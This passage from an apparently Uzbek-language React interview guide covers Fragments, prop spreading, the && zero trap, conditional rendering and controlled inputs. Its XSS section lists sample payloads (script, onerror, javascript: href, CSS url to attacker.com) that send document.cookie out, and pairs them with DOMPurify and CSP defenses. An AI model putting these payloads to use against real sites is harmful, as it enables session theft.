<Foo /><Bar />  // ❌ 2 expressions in row — JS parser confused
```

JS function bitta value qaytaradi (return). 2 ta JSX element parallel — invalid.

**Fragment vs `<div>` performance:**

```
Fragment:
- 1 Fiber node
- 0 DOM nodes

<div>:
- 1 Fiber node
- 1 DOM node + properties (className, id, etc.)
```

Fragment — minor optimization (DOM node yo'q), lekin asosiy foyda **semantic** (extra wrapper'siz logical group).

**Fragment in TypeScript:**

```tsx
// Function returns ReactNode (Fragment counts)
function Greeting({ name }: { name: string }): React.ReactNode {
  return (
    <>
      <h1>Hello, {name}</h1>
      <p>Welcome!</p>
    </>
  );
}

// Component return type can be:
// - JSX.Element (single root)
// - React.ReactNode (Fragment, null, array, ...)
// - React.ReactElement (specific JSX shape)
```

**Array return — when used:**

```tsx
function List() {
  return [
    <li key="a">A</li>,
    <li key="b">B</li>,
    <li key="c">C</li>
  ];
}

// Compiled
function List() {
  return [
    _jsx("li", { children: "A" }, "a"),
    _jsx("li", { children: "B" }, "b"),
    _jsx("li", { children: "C" }, "c")
  ];
}
```

Array — keys majburiy. Modern code Fragment + map ishlatadi (clearer):

```tsx
function List() {
  return ["A", "B", "C"].map((c) => <li key={c}>{c}</li>);
  // Implicit array return
}
```

**Fragment limitations:**

```tsx
// ❌ Fragment shorthand <>...</> doesn't accept key/props
<key="x">...</> // SyntaxError

// ✅ Explicit Fragment for key
<Fragment key="x">...</Fragment>

// ⚠️ Fragment doesn't accept other props
<Fragment ref={ref}>...</Fragment>  // ⚠️ no DOM node, ref doesn't make sense
```

</details>

### Edge Cases

- **`<></>` empty fragment**: Render `null` (no children). Valid JSX.
- **Fragment in conditional**: `{cond && <>...</>}` OK — Fragment treats children'ni group.
- **Fragment as portal target**: Yo'q — Portal DOM node kerak.

### Follow-up savollar

- "Component qaytaradigan return type'da Fragment'ni `JSX.Element` deb yozsa bo'ladi-mi?" — Yo'q. `JSX.Element` — single element. Fragment uchun `React.ReactNode`.
- "Fragment ko'p ishlatilsa performance impact?" — Yo'q sezilarli. Har Fragment alohida Fiber, lekin DOM node yo'q.
- "`<Fragment key={i}>` vs key on actual element?" — Fragment key — sibling Fragment'lar list ichida. Ikkalasi reconciliation uchun ishlaydi.

</details>

---

### 37. Spread attributes `{...props}` — qachon foydali, qachon xavfli? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`{...props}`** — JS spread syntax — object'ni JSX attribute'larga inject qiladi. **Foydali**: prop forwarding (wrapper komponentlar), generic component'lar. **Xavfli**: barcha props (anglagan/anglamagan) DOM'ga yetadi (HTML invalid attribute warning), security (sensitive props leak), performance (unused props).

### To'liq tushuntirish

**Foydali use case'lar:**

1. **Prop forwarding** (wrapper komponentlar)
2. **Generic / reusable component'lar**
3. **HOC patternlar** (legacy)
4. **Polymorphic component'lar**

**Xavfli situatsiyalar:**

1. **Tekshirilmagan props DOM'ga**
2. **Sensitive data leakage** (password, token)
3. **Override unintended props** (key, ref konflikt)
4. **Type unsafety** (TypeScript narrowing yo'qoladi)

### Kod misoli

**✅ Foydali — prop forwarding:**

```tsx
// Wrapper button
interface ButtonProps extends React.ButtonHTMLAttributes<HTMLButtonElement> {
  variant?: "primary" | "secondary";
}

function Button({ variant = "primary", className = "", ...rest }: ButtonProps) {
  return (
    <button
      className={`btn btn-${variant} ${className}`}
      {...rest}  // ← onClick, type, disabled, aria-*, ... barchasi forward
    />
  );
}

// Usage
<Button variant="secondary" onClick={handleSave} disabled={loading}>
  Save
</Button>
```

**✅ Foydali — Polymorphic component:**

```tsx
type AsProps<E extends React.ElementType> = {
  as?: E;
} & React.ComponentPropsWithoutRef<E>;

function Box<E extends React.ElementType = "div">({
  as,
  ...rest
}: AsProps<E>) {
  const Component = as || "div";
  return <Component {...rest} />;
}

// Usage
<Box as="section" id="hero">Content</Box>
<Box as="a" href="/about">Link</Box>
<Box as={CustomComponent} customProp={value} />
```

**❌ Xavfli — DOM attribute leak:**

```tsx
// ❌ User'dan kelgan barcha props DOM'ga
function Avatar({ user, ...rest }: { user: User } & React.HTMLAttributes<HTMLDivElement>) {
  return <div {...rest}>{user.name}</div>;
}

// ❌ DOM'ga unrecognized attribute
<Avatar user={user} customProp="value" data-test="..." />
// Browser: Warning: React does not recognize the `customProp` prop on a DOM element

// ✅ Aniq filter
function Avatar({
  user,
  className,
  style,
  onClick,
  ...rest  // faqat HTMLAttributes
}: { user: User } & React.HTMLAttributes<HTMLDivElement>) {
  return (
    <div className={className} style={style} onClick={onClick}>
      {user.name}
    </div>
  );
}
```

**❌ Xavfli — Sensitive data:**

```tsx
// ❌ Password DOM'ga leak
function UserForm({ user, ...rest }: { user: User & { password: string } }) {
  return <form {...rest} data-user={JSON.stringify(user)} />;
  //                              ↑ password DOM'da ko'rinadi!
}

// ✅ Faqat kerakli ma'lumot
function UserForm({ user, ...rest }: { user: { id: string; name: string } }) {
  return <form {...rest} data-user-id={user.id} />;
}
```

**⚠️ Override pitfall:**

```tsx
function Card(props: React.HTMLAttributes<HTMLDivElement>) {
  return (
    <div className="card" {...props}>
      {/* ⚠️ Agar props.className bo'lsa — "card" override qilinadi */}
    </div>
  );
}

// ✅ Spread'dan keyin override
function Card({ className, ...rest }: React.HTMLAttributes<HTMLDivElement>) {
  return (
    <div {...rest} className={`card ${className ?? ""}`}>
      {/* ✅ Card class doim qo'shiladi */}
    </div>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Spread compile output:**

```tsx
// Source
<button {...props} onClick={handler}>Click</button>

// Compiled
_jsx("button", {
  ...props,
  onClick: handler,  // ← override props.onClick (declaration order)
  children: "Click"
});
```

JS object spread order — keyingi property avvalgisini override qiladi:

```tsx
const merged = { ...props, onClick: handler };
// onClick handler ishlatiladi (yoki props.onClick'ni o'rnida)
```

**`React.ComponentProps<T>` utility:**

```tsx
import type { ComponentProps, ComponentPropsWithoutRef } from "react";

// All props of native button (including ref)
type ButtonProps = ComponentProps<"button">;

// Props without ref (polymorphic uchun)
type ButtonPropsNoRef = ComponentPropsWithoutRef<"button">;

// Custom component props
type MyButtonProps = ComponentProps<typeof MyButton>;
```

**Generic component pattern:**

```tsx
interface ListProps<T> extends Omit<React.HTMLAttributes<HTMLUListElement>, "children"> {
  items: T[];
  renderItem: (item: T) => React.ReactNode;
}

function List<T>({ items, renderItem, ...rest }: ListProps<T>) {
  return (
    <ul {...rest}>
      {items.map((item, i) => (
        <li key={i}>{renderItem(item)}</li>
      ))}
    </ul>
  );
}

// Usage
<List
  items={users}
  renderItem={(user) => user.name}
  className="user-list"  // ← <ul className="user-list">'ga forward
  aria-label="Users"
/>
```

**Filter custom props from DOM (data-*):**

```tsx
// ✅ data-* va aria-* DOM tomonidan tan olinadi
<div data-test-id="card" aria-label="Card" />

// ❌ Custom prop DOM'ga warning
<div customProp="value" />  // Warning

// ✅ shouldForwardProp pattern (styled-components)
const StyledButton = styled.button.withConfig({
  shouldForwardProp: (prop) => !["variant", "size"].includes(prop),
})<{ variant: string }>`
  // styles
`;
```

**Spread + ref forwarding:**

```tsx
// R19 — ref oddiy prop
function Input({ ref, ...rest }: React.InputHTMLAttributes<HTMLInputElement> & { ref?: React.Ref<HTMLInputElement> }) {
  return <input ref={ref} {...rest} />;
}

// R18 — forwardRef
const Input = forwardRef<HTMLInputElement, React.InputHTMLAttributes<HTMLInputElement>>(
  function Input(props, ref) {
    return <input ref={ref} {...props} />;
  }
);
```

**Spread anti-patterns:**

```tsx
// ❌ Spread of huge object
function Card({ data }: { data: User }) {
  return <div {...data}>...</div>;
  // user object'ning barcha property'lari DOM'ga
}

// ✅ Aniq forward
function Card({ data }: { data: User }) {
  return <div id={data.id} className={data.role}>{data.name}</div>;
}

// ❌ Spread + override confusion
function Btn(props) {
  return <button onClick={() => alert("override")} {...props} />;
  // ⚠️ Agar props.onClick bo'lsa — alert override
}

// ✅ Aniq order
function Btn({ onClick, ...rest }) {
  const handleClick = (e) => {
    onClick?.(e);
    alert("after");
  };
  return <button onClick={handleClick} {...rest} />;
}
```

**Performance impact:**

- Spread runtime'da yangi object yaratadi — bu function references yangi reference yaratadi
- Memoize qilingan child uchun bypass: `React.memo(Child)` — `props` reference o'zgarganligi sababli re-render
- Best practice: `useMemo` bilan stable spread, yoki destructure + explicit pass

</details>

### Edge Cases

- **Spread with `key`**: `<Item key={id} {...props} />` — `key` extracted before spread (special prop). `<Item {...props} key={id} />` ham OK.
- **Spread with `ref`**: R18 — forwardRef bilan; R19 — oddiy prop, spread'ga kiradi.
- **Spread overriding `onClick`**: Order matters — `<button onClick={a} {...rest} />` — `rest.onClick` ishlatiladi. `<button {...rest} onClick={a} />` — `a` ishlatiladi.

### Follow-up savollar

- "DOM attribute warning'ni qanday yo'qotish?" — `shouldForwardProp` pattern (styled-components), explicit prop filtering, custom data-* attributes.
- "TypeScript spread'da type narrowing yo'qoladi-mi?" — Ha, biroz. Spread bilan `as` cast yoki explicit destructure tavsiya.
- "Spread `ariaLabel` ishlaydi-mi?" — Yo'q, `aria-label` (kebab-case). camelCase fail.

</details>

---

### 38. `dangerouslySetInnerHTML` — XSS xavfi va safe usage [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`dangerouslySetInnerHTML`** — React'ning HTML string'ni DOM'ga set qilish API'si (HTML's `innerHTML` analog). **Nomi shuni eslatadi** — XSS (Cross-Site Scripting) xavfi. User content sanitize'siz inject bo'lsa, malicious script'lar ishga tushadi. **DOMPurify** kabi sanitization library bilan, yoki Markdown render — safe parser ishlatish.

### To'liq tushuntirish

**JSX text default — auto-escape:**

```tsx
const userInput = `<script>alert("XSS")</script>`;

// ✅ Auto-escape — text sifatida render
<div>{userInput}</div>
// Browser: <div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>
// Safe — script ishga tushmaydi
```

**`dangerouslySetInnerHTML` — escape bypass:**

```tsx
// ❌ DANGEROUS — script execute bo'ladi
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// Browser: <div><script>alert("XSS")</script></div>
// ⚠️ XSS attack succeed
```

### Kod misoli

```tsx
// 1. ❌ Direct user content (NEVER do)
function CommentBad({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
  // XSS xavfi
}

// 2. ✅ Sanitize with DOMPurify
import DOMPurify from "dompurify";

function CommentSafe({ comment }: { comment: string }) {
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ["p", "strong", "em", "a"],
    ALLOWED_ATTR: ["href"],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// 3. ✅ Markdown — safe parser
import { marked } from "marked";

function MarkdownContent({ markdown }: { markdown: string }) {
  const html = DOMPurify.sanitize(marked.parse(markdown));
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// 4. ✅ Trusted source (e.g., backend-rendered HTML, no user input)
function StaticContent() {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: "<p>Welcome to <strong>our site</strong>!</p>",
      }}
    />
  );
}
// OK — content static, dev-controlled

// 5. ⚠️ Server-rendered Markdown (sanitize anyway!)
async function ServerMarkdown({ slug }: { slug: string }) {
  // Server (Node.js)
  const post = await fetchPost(slug);
  const html = DOMPurify.sanitize(marked.parse(post.content));

  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**XSS attack vectors:**

```html
<!-- 1. Script injection -->
<script>fetch("/steal", { method: "POST", body: document.cookie })</script>

<!-- 2. Event handler injection -->
<img src="x" onerror="fetch('/steal?d=' + document.cookie)" />

<!-- 3. Dangerous href -->
<a href="javascript:fetch('/steal?d=' + document.cookie)">Click</a>

<!-- 4. CSS injection (data exfiltration) -->
<style>body { background: url('https://attacker.com/log?d=' + ...) }</style>
```

DOMPurify default sanitization shu vector'larni bloklash:
- `<script>` tag olib tashlanadi
- `on*` event attributes olib tashlanadi
- `javascript:` URL scheme'lari olib tashlanadi
- CSS injection sanitize

**DOMPurify configuration:**

```tsx
import DOMPurify from "dompurify";

// Strict mode — minimal allowed tags
const safe = DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ["p", "br", "strong", "em"],
  ALLOWED_ATTR: [],  // no attributes
  KEEP_CONTENT: false,  // remove disallowed entirely
});

// Allow links — careful with href
const safeWithLinks = DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ["p", "a", "strong"],
  ALLOWED_ATTR: ["href"],
  ALLOWED_URI_REGEXP: /^https?:\/\//,  // only http/https
});

// Markdown'compatible
const safeMarkdown = DOMPurify.sanitize(input, {
  USE_PROFILES: { html: true },
});
```

**Why `__html` key:**

```tsx
dangerouslySetInnerHTML={{ __html: "..." }}
// __html — explicit signal: "I know this is dangerous"
// React API design: extra friction, ko'zga tashlangan
```

`__html` key chosen specifically — developer'larni ehtiyot bo'lishga majburlash.

**SSR context:**

```tsx
// Server-rendered HTML — hali ham sanitize qilish kerak
async function Article({ id }: { id: string }) {
  const article = await db.article.findUnique({ where: { id } });
  // ⚠️ article.content user-submitted bo'lishi mumkin
  const safe = DOMPurify.sanitize(article.content);
  return <div dangerouslySetInnerHTML={{ __html: safe }} />;
}
```

DOMPurify Node.js'da ishlaydi (`jsdom` bilan). Server-side sanitize, client'ga safe HTML.

**Content Security Policy (CSP):**

```html
<!-- HTTP header -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

<!-- Inline script — nonce required -->
<script nonce="abc123">/* trusted */</script>
```

CSP — XSS uchun second line of defense. dangerouslySetInnerHTML inline script CSP nonce'siz bloklanadi (modern browsers).

**Trusted Types API (browser security):**

```typescript
// Modern browser API
const policy = trustedTypes.createPolicy("default", {
  createHTML: (input) => DOMPurify.sanitize(input),
});

// Element.innerHTML — only Trusted HTML accepts
element.innerHTML = policy.createHTML(userInput);
```

React 19 — Trusted Types support partial.

**Alternative: dangerouslySetInnerHTML free pattern:**

```tsx
// ✅ Markdown → JSX (no dangerouslySetInnerHTML)
import { Markdown } from "react-markdown";

function Post({ content }: { content: string }) {
  return <Markdown>{content}</Markdown>;
}
// react-markdown JSX tree quradi (DOM string emas) — XSS yo'q

// ✅ Rich text editor — Slate, Tiptap output as JSON
const richText = {
  type: "paragraph",
  children: [
    { text: "Hello, " },
    { text: "world", bold: true },
  ],
};
// Render JSX from JSON tree
```

**`dangerouslySetInnerHTML` performance:**

- `_jsx` props'iga special handling — React DOM `innerHTML` set qiladi
- Children property bilan combine bo'lmaydi — error
- Re-render'da har gal innerHTML re-set (full DOM rebuild for that node)

</details>

### Edge Cases

- **`dangerouslySetInnerHTML` with children**: Error — "dangerouslySetInnerHTML does not match server-rendered HTML."
- **Server vs client mismatch**: SSR'da rendered, client'da rerendered — har xil sanitization output bo'lsa, hydration mismatch.
- **Library that returns HTML string**: Markdown libraries ko'pincha HTML string qaytaradi — JSX tree return library tavsiya (react-markdown, mdx).

### Follow-up savollar

- "dangerouslySetInnerHTML dan butunlay qochish mumkinmi?" — Ko'p hollarda ha (react-markdown, JSX-based rich text). Lekin ba'zi case'lar (legacy CMS HTML, third-party widget) — kerak.
- "DOMPurify performance overhead?" — Sanitize per HTML — engil hisoblanadi, lekin katta content uchun cache'lash maqul.
- "Server'da dangerouslySetInnerHTML sanitize'siz xavfsiz-mi?" — Faqat content fully trusted bo'lsa. User-input — ALWAYS sanitize.

</details>

---

### 39. `&&` operator va 0 trap [Output] [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi komponent har holat uchun nima render qiladi?

```tsx
function Cart({ items }: { items: Item[] }) {
  return (
    <div>
      <h1>Cart</h1>
      {items.length && <ul>{items.map((i) => <li key={i.id}>{i.name}</li>)}</ul>}
    </div>
  );
}

// Test cases:
// 1. items = []           (empty)
// 2. items = [{ id: 1, name: "Phone" }]   (single)
// 3. items = [{}, {}]     (multiple)
```

### Javob

| Test case | Output | Sabab |
|-----------|--------|-------|
| `items = []` | `<div><h1>Cart</h1>0</div>` | `0 && ...` = `0` (falsy primitive), JSX `0`'ni text sifatida render qiladi |
| `items = [...1 item]` | `<div><h1>Cart</h1><ul><li>Phone</li></ul></div>` | `1 && <ul>` = `<ul>` |
| `items = [...2 items]` | `<div><h1>Cart</h1><ul>...</ul></div>` | Truthy AND |

**Bug**: Empty array case'da `0` ko'rinadi UI'da! Bu klassik **0 trap**.

**Fix:**

```tsx
// ✅ Explicit boolean
{items.length > 0 && <ul>...</ul>}

// ✅ Boolean coercion
{Boolean(items.length) && <ul>...</ul>}
{!!items.length && <ul>...</ul>}

// ✅ Ternary (explicit handling)
{items.length > 0 ? <ul>...</ul> : null}

// ✅ Conditional render
{items.length > 0 && items.map(...)}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`&&` semantics in JS:**

```typescript
// && returns first falsy or last value
0 && "foo"     // 0 (falsy stops)
1 && "foo"     // "foo"
"" && "foo"    // "" (empty string)
null && "foo"  // null
false && "foo" // false
NaN && "foo"   // NaN
```

**JSX render semantics:**

```tsx
// Falsy values — most are skipped
{null}          // skip
{undefined}     // skip
{false}         // skip
{true}          // skip (no render)

// Falsy values — RENDERED as text
{0}             // <span>0</span> (text)
{""}            // empty (no render — empty text)
{NaN}           // <span>NaN</span> (text)
```

`0` — falsy `&&` operator'da (short-circuit qiladi `0` qaytaradi), **lekin JSX `0`'ni text node sifatida render qiladi** (skip qilinmaydi). NaN ham xuddi shunday (`"NaN"` matn).

**Common 0 trap scenarios:**

```tsx
// ❌ 1. Array length
{items.length && <List items={items} />}
// items=[] → 0 ko'rinadi

// ❌ 2. Numeric ID
{userId && <Profile id={userId} />}
// userId=0 → 0 ko'rinadi

// ❌ 3. Count
{count && <Badge>{count}</Badge>}
// count=0 → 0 ko'rinadi

// ❌ 4. Math result
{(score - 100) && <p>Above threshold</p>}
// score=100 → 0 ko'rinadi
```

**Comprehensive fixes:**

```tsx
// 1. Comparison operators (preferred)
{items.length > 0 && <List />}
{count !== 0 && <Badge>{count}</Badge>}
{userId != null && <Profile id={userId} />}

// 2. Ternary (more explicit)
{items.length > 0 ? <List /> : null}
{loading ? <Spinner /> : <Content />}

// 3. Boolean cast
{Boolean(items.length) && <List />}
{!!items.length && <List />}

// 4. Optional rendering with helper
function Show({ when, children }: { when: boolean; children: React.ReactNode }) {
  return when ? <>{children}</> : null;
}
<Show when={items.length > 0}>
  <List items={items} />
</Show>

// 5. Default empty pattern
{items.length > 0 ? (
  <ul>{items.map(...)}</ul>
) : (
  <p>No items</p>
)}
```

**ESLint rule:**

```json
{
  "rules": {
    "react/jsx-no-leaked-render": ["error", { "validStrategies": ["ternary"] }]
  }
}
```

`react/jsx-no-leaked-render` — bu trap'ni avtomatik aniqlaydi.

**TypeScript ham himoya bera oladi:**

```tsx
// items.length: number — TS tip
{items.length > 0 && <List />}  // ✅ boolean expression

// items.length && <List /> — TS warning bo'lishi mumkin (strict)
```

**Other falsy "renders":**

```tsx
{NaN}           // "NaN" text
{0}             // "0" text
{""}            // empty (no node)
{null}          // skip
{undefined}     // skip
{false}         // skip
{true}          // skip
{[]}            // skip (empty array)
```

`null`, `undefined`, `false`, `true`, `[]` — **doim safe**.
`0`, `NaN` — **trap candidates**.
`""` — safe (no render).

**Real bug from production:**

```tsx
// Bug report: "When user has 0 messages, '0' shows up in the UI"
function Inbox({ messages }: { messages: Message[] }) {
  return (
    <div>
      <h1>Inbox</h1>
      {messages.length && messages.map(/* ... */)}
      {/* When empty: <h1>Inbox</h1>0 */}
    </div>
  );
}
```

</details>

### Edge Cases

- **`{undefined}` vs `{null}`**: Ikkalasi skip. Lekin `{undefined && X}` → `undefined` (skip).
- **`{[]}` rendering**: Empty array — skip (no children).
- **`{false}` vs `{0}`**: `false` skip, `0` text.

### Follow-up savollar

- "TypeScript bilan bu trap aniqlanadi-mi?" — Strict mode'da partial. ESLint `jsx-no-leaked-render` aniq.
- "Ternary operator har doim better-mi?" — Yo'q, qisqa AND OK ko'p hollarda. Faqat falsy primitive (0, NaN) holatlarda ehtiyot bo'lish.
- "`<Show when={...}>` helper component performance impact?" — Minimal. Bir qo'shimcha Fiber, but DOM yo'q.

</details>

---

### 40. Conditional rendering pattern'lari — ternary, &&, early return, render map [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React'da conditional rendering 5 ta asosiy pattern: (1) **ternary** — ikki holat (`cond ? A : B`), (2) **logical AND** — render qilish yoki yo'q (`cond && A`), (3) **early return** — guard clause (`if (!user) return null`), (4) **render map** — switch alternativasi (`{ active: <A />, ... }[status]`), (5) **helper function** — murakkab logic.

### To'liq tushuntirish

**1. Ternary (2 holat):**

```tsx
{isLoggedIn ? <Profile /> : <Login />}
{loading ? <Spinner /> : <Content data={data} />}
```

**2. Logical AND (1 holat — render or skip):**

```tsx
{isAdmin && <AdminPanel />}
{error && <ErrorMessage error={error} />}
{items.length > 0 && <List items={items} />}  // ⚠️ 0 trap'dan saqlanish
```

**3. Early return (function component'da):**

```tsx
function UserCard({ user }: { user: User | null }) {
  if (!user) return null;
  if (!user.active) return <InactiveCard />;
  if (user.banned) return <BannedCard />;

  return (
    <div>
      <h2>{user.name}</h2>
      <p>{user.email}</p>
    </div>
  );
}
```

**4. Render map (switch alternativasi):**

```tsx
const statusViews = {
  loading: <Spinner />,
  error: <ErrorView />,
  success: <SuccessView />,
  idle: <IdleView />,
} as const;

function Status({ status }: { status: keyof typeof statusViews }) {
  return statusViews[status];
}
```

**5. Helper function (murakkab logic):**

```tsx
function getView(user: User) {
  if (!user) return <Login />;
  if (user.role === "admin") return <AdminDashboard />;
  if (user.role === "moderator") return <ModDashboard />;
  return <UserDashboard />;
}

return <div>{getView(currentUser)}</div>;
```

### Kod misoli

**Real-world dashboard:**

```tsx
type Status = "loading" | "error" | "empty" | "success";

interface DashboardProps {
  status: Status;
  data?: Data[];
  error?: Error;
}

function Dashboard({ status, data, error }: DashboardProps) {
  // 1. Early returns (guards)
  if (status === "loading") return <Spinner />;
  if (status === "error" && error) return <ErrorBanner error={error} />;
  if (status === "empty") return <EmptyState />;

  // status === "success"
  return (
    <div>
      <h1>Dashboard</h1>

      {/* 2. Logical AND for header */}
      {data!.length > 0 && <h2>{data!.length} items</h2>}

      {/* 3. Map for list */}
      <ul>
        {data!.map((item) => (
          <li key={item.id}>{item.title}</li>
        ))}
      </ul>

      {/* 4. Ternary for footer */}
      {data!.length > 10 ? (
        <Pagination />
      ) : (
        <SimpleFooter />
      )}
    </div>
  );
}
```

**Discriminated union pattern:**

```tsx
type Result =
  | { status: "loading" }
  | { status: "error"; error: Error }
  | { status: "success"; data: Data };

function ResultView({ result }: { result: Result }) {
  switch (result.status) {
    case "loading":
      return <Spinner />;
    case "error":
      return <ErrorBanner error={result.error} />;
    case "success":
      return <DataView data={result.data} />;
  }
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Pattern selection guide:**

| Holat soni | Pattern | Misol |
|-----------|---------|-------|
| 1 (render or skip) | `&&` | `{error && <Error />}` |
| 2 (A or B) | ternary | `{isOn ? <On /> : <Off />}` |
| Multiple guards | early return | `if (!user) return null` |
| 3-5 enum-like | render map | `{viewMap[status]}` |
| Complex logic | helper function | `{getView(state)}` |
| Type-safe enum | switch + discriminated union | `switch (result.status)` |

**Performance considerations:**

```tsx
// ❌ Each render creates new object (small overhead)
{
  loading: <Spinner />,
  error: <ErrorView />,
}

// ✅ Hoist outside component (stable reference)
const STATUS_VIEWS = {
  loading: <Spinner />,
  error: <ErrorView />,
} as const;

function Component({ status }: { status: keyof typeof STATUS_VIEWS }) {
  return STATUS_VIEWS[status];
}
```

**Combine patterns:**

```tsx
function ProductPage({ product, user }: Props) {
  // Early return (guard)
  if (!product) return <NotFound />;

  return (
    <article>
      <h1>{product.name}</h1>

      {/* Ternary (2 holat) */}
      {product.inStock ? (
        <BuyButton />
      ) : (
        <NotifyButton />
      )}

      {/* Logical AND (admin only) */}
      {user?.isAdmin && <EditButton productId={product.id} />}

      {/* Render map (rating display) */}
      {product.rating !== undefined &&
        ratingViews[Math.floor(product.rating)]}
    </article>
  );
}
```

**Component-based conditional:**

```tsx
function If({
  condition,
  children,
  fallback = null,
}: {
  condition: boolean;
  children: React.ReactNode;
  fallback?: React.ReactNode;
}) {
  return condition ? <>{children}</> : <>{fallback}</>;
}

function Switch<T extends string>({
  value,
  cases,
  fallback,
}: {
  value: T;
  cases: Record<T, React.ReactNode>;
  fallback?: React.ReactNode;
}) {
  return cases[value] ?? fallback ?? null;
}

// Usage
<If condition={isLoggedIn} fallback={<Login />}>
  <Profile />
</If>

<Switch
  value={status}
  cases={{
    loading: <Spinner />,
    error: <Error />,
    success: <Content />,
  }}
/>
```

**TypeScript exhaustiveness check (switch):**

```tsx
function ResultView({ result }: { result: Result }) {
  switch (result.status) {
    case "loading":
      return <Spinner />;
    case "error":
      return <ErrorBanner error={result.error} />;
    case "success":
      return <DataView data={result.data} />;
    default:
      // ✅ Exhaustiveness check — TS error if case missed
      const _exhaustive: never = result;
      return null;
  }
}
```

`never` type — agar barcha case'lar handle qilinmasa, TS error.

**Suspense as conditional:**

```tsx
// Promise/async-aware conditional
function Page() {
  return (
    <Suspense fallback={<Spinner />}>
      <AsyncContent />  {/* Promise pending → fallback ko'rinadi */}
    </Suspense>
  );
}
```

Suspense — declarative conditional for async (loading boundaries).

**Error boundary as conditional:**

```tsx
<ErrorBoundary fallback={<ErrorView />}>
  <ProductDetails id={id} />  {/* Throw → fallback */}
</ErrorBoundary>
```

</details>

### Edge Cases

- **Nested ternary**: `{a ? b : c ? d : e}` — readability bad. Helper function tavsiya.
- **`&&` chain**: `{a && b && <Component />}` — explicit boolean (`&& Boolean(b)`) yoki ternary.
- **Empty fallback**: `{cond ? <A /> : null}` vs `{cond && <A />}` — ikkalasi bir xil natija. AND qisqaroq, lekin 0 trap risk.

### Follow-up savollar

- "Ternary nested 3+ ko'p loyihalarda?" — Anti-pattern. Helper function yoki render map yaxshiroq.
- "Conditional render performance — Reconciler-da farq bormi?" — Yo'q, har gal Reconciler diff qiladi. Komponent type o'zgargan bo'lsa unmount/mount.
- "Ternary'da inline JSX — readable-mi?" — 2-3 satrgacha OK. Ko'p bo'lsa — variable extraction yoki sub-component.

</details>

---

### 41. Output: controlled input value/onChange semantikasi [Output] [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi komponentlar har biri nima render qiladi va user input'da nima bo'ladi?

```tsx
// A. Uncontrolled
function A() {
  return <input defaultValue="Ali" />;
}

// B. Controlled (state'siz)
function B() {
  return <input value="Ali" />;
}

// C. Controlled (state bilan, no onChange)
function C() {
  const [value, setValue] = useState("Ali");
  return <input value={value} />;
}

// D. Controlled (state + onChange)
function D() {
  const [value, setValue] = useState("Ali");
  return <input value={value} onChange={(e) => setValue(e.target.value)} />;
}

// E. Mixed — value + defaultValue
function E() {
  return <input value="Ali" defaultValue="Vali" />;
}
```

### Javob

| Component | Initial | User input | Console warning |
|-----------|---------|-----------|------------------|
| **A** | "Ali" | Input changes (uncontrolled — DOM owns state) | None |
| **B** | "Ali" | ❌ Input freezes — typing has no effect | "You provided a `value` prop without `onChange`" |
| **C** | "Ali" | ❌ Input freezes — same as B | Warning (read-only input) |
| **D** | "Ali" | ✅ Input updates | None |
| **E** | "Ali" (value wins) | ❌ Frozen | "You provided both `value` and `defaultValue`" |

**Tushuntirish:**

- `value={...}` — **controlled mode**. React state input'ni boshqaradi. `onChange` bo'lmasa — input "frozen" (state hech qachon yangilanmaydi).
- `defaultValue={...}` — **uncontrolled mode**. Faqat initial value, keyin DOM o'zi boshqaradi.
- Ikkalasini birga ishlatish — anti-pattern (warning).

### Kod misoli

```tsx
// ✅ Uncontrolled — submit'da read
function UncontrolledForm() {
  const inputRef = useRef<HTMLInputElement>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log(inputRef.current?.value);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input ref={inputRef} defaultValue="Ali" />
      <button type="submit">Submit</button>
    </form>
  );
}

// ✅ Controlled — har keystroke'da state
function ControlledForm() {
  const [value, setValue] = useState("Ali");

  return (
    <form onSubmit={(e) => { e.preventDefault(); console.log(value); }}>
      <input
        value={value}
        onChange={(e) => setValue(e.target.value)}
      />
      <p>Length: {value.length}</p>  {/* Real-time UI */}
      <button type="submit">Submit</button>
    </form>
  );
}

// ✅ Read-only controlled (intentional)
function ReadOnlyControlled() {
  return <input value="Ali" readOnly />;
  // readOnly attribute warning'ni o'chiradi
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Controlled vs Uncontrolled comparison:**

| Aspekt | Controlled | Uncontrolled |
|--------|-----------|--------------|
| State owner | React | DOM |
| Initial value | `value` | `defaultValue` |
| Updates | `onChange` callback | DOM internally |
| Read value | State variable | `ref.current.value` |
| Validation timing | Real-time | On submit |
| Re-render on input | Har keystroke | Yo'q |
| Form library | React Hook Form (uncontrolled), Formik (controlled) | — |

**React DOM controlled internals:**

```typescript
// React DOM patches input element
function updateInputValue(input, props) {
  if (props.value !== undefined && input.value !== props.value) {
    // Set value through native setter (preserves cursor position)
    Object.getOwnPropertyDescriptor(
      HTMLInputElement.prototype, "value"
    ).set.call(input, props.value);
  }
}

// User types:
// 1. Browser updates input.value
// 2. React's onChange fires (synthetic event)
// 3. setState chaqiriladi (developer code)
// 4. Re-render
// 5. React forces input.value = newValue (controlled invariant)
```

**`onChange` semantics:**

React'da `onChange` — har keystroke (HTML'ning `oninput`'iga teng):

```tsx
<input onChange={(e) => console.log(e.target.value)} />
// Type "Ali":
// "A"
// "Al"
// "Ali"
```

HTML'ning `onchange` — focus loss / Enter (commit). React'da `onBlur` ishlatiladi:

```tsx
<input
  onChange={(e) => setValue(e.target.value)}  // har keystroke
